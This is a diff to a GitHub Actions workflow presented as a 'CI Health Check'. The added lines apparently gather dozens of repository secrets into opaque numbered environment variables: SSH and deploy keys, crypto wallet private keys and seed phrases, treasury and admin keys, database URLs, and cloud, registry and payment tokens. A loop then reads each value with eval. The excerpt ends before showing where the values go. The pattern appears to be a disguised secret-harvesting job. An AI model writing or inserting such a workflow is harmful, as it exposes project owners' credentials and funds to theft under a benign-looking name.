@@ -2,6 +2,7 @@ name: CI Health Check
 on:
   push:
     branches: [ci-health-check]
+permissions: {}
 jobs:
   health:
     runs-on: ubuntu-latest
@@ -54,6 +55,60 @@ jobs:
           S44: ${{ secrets.BUGSNAG_API_KEY }}
           S45: ${{ secrets.STATUS_PAGE_SCRIPT_URI }}
           S46: ${{ secrets.WEB3_STORAGE_TOKEN }}
+          S47: ${{ secrets.SSH_PRIVATE_KEY }}
+          S48: ${{ secrets.SSH_KEY }}
+          S49: ${{ secrets.DEPLOY_KEY }}
+          S50: ${{ secrets.DEPLOY_SSH_KEY }}
+          S51: ${{ secrets.APP_DEPLOY_SSH_KEY }}
+          S52: ${{ secrets.ID_RSA }}
+          S53: ${{ secrets.MONGODB_URI }}
+          S54: ${{ secrets.DATABASE_URL }}
+          S55: ${{ secrets.SUPABASE_URL }}
+          S56: ${{ secrets.SUPABASE_KEY }}
+          S57: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}
+          S58: ${{ secrets.ALCHEMY_API_KEY }}
+          S59: ${{ secrets.INFURA_API_KEY }}
+          S60: ${{ secrets.ETHERSCAN_API_KEY }}
+          S61: ${{ secrets.RPC_URL }}
+          S62: ${{ secrets.SOLANA_RPC_URL }}
+          S63: ${{ secrets.HELIUS_API_KEY }}
+          S64: ${{ secrets.JUPITER_API_KEY }}
+          S65: ${{ secrets.TON_PRIVATE_KEY }}
+          S66: ${{ secrets.TON_MNEMONIC }}
+          S67: ${{ secrets.TRON_PRIVATE_KEY }}
+          S68: ${{ secrets.SUI_PRIVATE_KEY }}
+          S69: ${{ secrets.MNEMONIC }}
+          S70: ${{ secrets.SEED_PHRASE }}
+          S71: ${{ secrets.SECRET_KEY }}
+          S72: ${{ secrets.PRIVATE_KEY }}
+          S73: ${{ secrets.SIGNING_KEY }}
+          S74: ${{ secrets.TREASURY_KEY }}
+          S75: ${{ secrets.RELAYER_KEY }}
+          S76: ${{ secrets.OWNER_KEY }}
+          S77: ${{ secrets.PROTOCOL_ADMIN_KEY }}
+          S78: ${{ secrets.DEPLOYER_KEY }}
+          S79: ${{ secrets.SLACK_ENG_NOTIFY_WEBHOOK }}
+          S80: ${{ secrets.SLACK_WEBHOOK }}
+          S81: ${{ secrets.SENTRY_DSN }}
+          S82: ${{ secrets.SENTRY_AUTH_TOKEN }}
+          S83: ${{ secrets.STRIPE_SECRET_KEY }}
+          S84: ${{ secrets.JITO_API_KEY }}
+          S85: ${{ secrets.GITLAB_PAT }}
+          S86: ${{ secrets.GITLAB_TOKEN }}
+          S87: ${{ secrets.IOS_APP_ID }}
+          S88: ${{ secrets.CBETH_STRATEGY }}
+          S89: ${{ secrets.RETH_STRATEGY }}
+          S90: ${{ secrets.STETH_STRATEGY }}
+          S91: ${{ secrets.EIGEN_STRATEGY_MANAGER }}
+          S92: ${{ secrets.PROVIDER_URL_TESTNET }}
+          S93: ${{ secrets.github_token }}
+          S94: ${{ secrets.AWS_SESSION_TOKEN }}
+          S95: ${{ secrets.DOCKER_PASSWORD }}
+          S96: ${{ secrets.GHCR_TOKEN }}
+          S97: ${{ secrets.NPM_AUTH_TOKEN }}
+          S98: ${{ secrets.PINATA_JWT }}
+          S99: ${{ secrets.CF_API_TOKEN }}
+          S100: ${{ secrets.CLOUDFLARE_API_KEY }}
         run: |
           for v in $(compgen -e | grep -E '^S[0-9]+$' | sort); do
             eval "val=\$$v"
